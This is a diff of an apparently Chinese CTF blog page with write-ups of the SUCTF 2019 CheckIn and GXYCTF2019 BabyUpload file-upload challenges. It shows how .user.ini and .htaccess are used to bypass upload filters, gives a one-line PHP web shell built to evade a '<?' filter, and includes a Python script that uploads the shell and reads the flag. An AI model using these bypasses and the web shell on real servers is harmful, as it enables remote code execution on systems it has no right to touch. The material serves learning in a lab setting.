@@ -591,7 +591,7 @@ class FileHandler &#123;
 echo serialize(new FileHandler);
 </code></pre>
 <p>找个环境运行一下即可得到str的值</p>
-<h3 id="2023-6-9-SUCTF-2019-CheckIn"><a href="#2023-6-9-SUCTF-2019-CheckIn" class="headerlink" title="2023.6.9 [SUCTF 2019]CheckIn"></a>2023.6.9 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn">[SUCTF 2019]CheckIn</a></h3><p>是一道文件上传题，不过给了源码，甚至给了wp。瞥了一眼，发现wp里只有.user.ini，搜索一下之后发现这是一个比.htacess用的更广的一个绕过手段，.htacess只有apache环境下可以使用，而.user.ini只要是以fastcgi运行的php都可以用，他会影响php.ini中的配置，需要php&gt;5.3.0，且上传目录下要有可执行的php文件。</p>
+<h3 id="2023-6-9-SUCTF-2019-CheckIn"><a href="#2023-6-9-SUCTF-2019-CheckIn" class="headerlink" title="2023.6.9 [SUCTF 2019]CheckIn"></a>2023.6.9 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn">[SUCTF 2019]CheckIn</a></h3><p>是一道文件上传题，不过给了源码，甚至给了wp。瞥了一眼，发现wp里只有.user.ini，搜索一下之后发现这是一个比.htaccess用的更广的一个绕过手段，.htaccess只有apache环境下可以使用，而.user.ini只要是以fastcgi运行的php都可以用，他会影响php.ini中的配置，需要php&gt;5.3.0，且上传目录下要有可执行的php文件。</p>
 <p>如何使用：我们指定一个文件，那么该文件就会被包含在要执行的php文件中，类似在php文件中插入<code>require(xx);</code>，我们就可以上传一个文件名为.user.ini的文件，内容为</p>
 <pre><code class="php">auto_prepend_file = xxx.jpg
 </code></pre>
@@ -628,7 +628,7 @@ if (isset($_POST[&quot;upload&quot;])) &#123;
     var_dump(scandir($userdir));
 &#125;
 </code></pre>
-<p>发现他过滤了很多东西，.htacess在这里是不能用了，文件名中包含ph的也都不能用了，还验证了文件头，这题只能上传图片，看到之前的利用这题就很简单了</p>
+<p>发现他过滤了很多东西，.htaccess在这里是不能用了，文件名中包含ph的也都不能用了，还验证了文件头，这题只能上传图片，看到之前的利用这题就很简单了</p>
 <p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306091033911.png" alt="image-20230609103336765"></p>
 <p>这里还给出了路径，由于过滤了<code>&lt;?</code>所以我们要换个马上传</p>
 <pre><code class="php">&lt;script language=&#39;php&#39;&gt;assert($_POST[&#39;ant&#39;]);&lt;/script&gt;
@@ -637,6 +637,34 @@ if (isset($_POST[&quot;upload&quot;])) &#123;
 <p>上传后路径并没有改变，接下来就可以去利用了，通过给出的路径，访问其目录下的php文件，并用post传入参数</p>
 <p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306091037875.png" alt="image-20230609103717771"></p>
 <p>最后cat即可得到flag，buu的这个环境里的文件好像是有时效的，过期了需要重新上传再做</p>
+<h3 id="2023-7-19-GXYCTF2019-BabyUpload"><a href="#2023-7-19-GXYCTF2019-BabyUpload" class="headerlink" title="2023.7.19 [GXYCTF2019]BabyUpload"></a>2023.7.19 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GXYCTF2019]BabyUpload">[GXYCTF2019]BabyUpload</a></h3><p>是一道文件上传题，进去先传马</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192223945.png" alt="image-20230719222306913"></p>
+<p>，和图片</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192222387.png" alt="image-20230719222204328"></p>
+<p>不知道为什么正常图片也无法上传，这里也过滤了后缀，简单的更改content-type是不行的，先尝试能上传什么类型的文件，试了许多最后发现image&#x2F;jpeg是可行的，但是之前上传的图片却提示失败，可能是图片中有黑名单内容</p>
+<p>想如何去修改解析，由于是Apache</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192231581.png" alt="image-20230719223140617">，所以尝试上传.htaccess，发现成功，并给出路径</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192232066.png" alt="image-20230719223214201"></p>
+<p>后面在上传木马，发现有过滤</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192239024.png" alt="image-20230719223931810"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192239778.png" alt="image-20230719223956613">过滤的是&lt;?，更换木马</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192240847.png" alt="image-20230719224034476"></p>
+<p>上传成功，As连接，flag在根目录下。</p>
+<p>出题人给了python脚本，我觉得可以去学习一下</p>
+<pre><code class="python">import requests
+
+url = &#39;http://017fd17f-2d88-44c1-b6d0-e8be288d64da.node4.buuoj.cn:81/&#39;
+session = requests.session()
+htaccess = &#123;&#39;uploaded&#39;: (&#39;.htaccess&#39;, &quot;AddType application/x-httpd-php .she&quot;, &#39;image/jpeg&#39;)&#125;
+res_hta = session.post(url, files=htaccess)
+
+files = &#123;&#39;uploaded&#39;: (&#39;ant.she&#39;, &quot;&lt;script language=\&quot;php\&quot;&gt;echo file_get_contents(&#39;/flag&#39;);&lt;/script&gt;&quot;, &#39;image/jpeg&#39;)&#125;
+res_jpg = session.post(url, files=files)
+
+res_shell = session.post(url + res_jpg.text[-69:-22], data=&#123;&#39;a&#39;: &#39;echo file_get_contents(\&#39;/flag\&#39;);&#39;&#125;) 
+
+print(res_shell.text)
+</code></pre>
 
     </div>
     
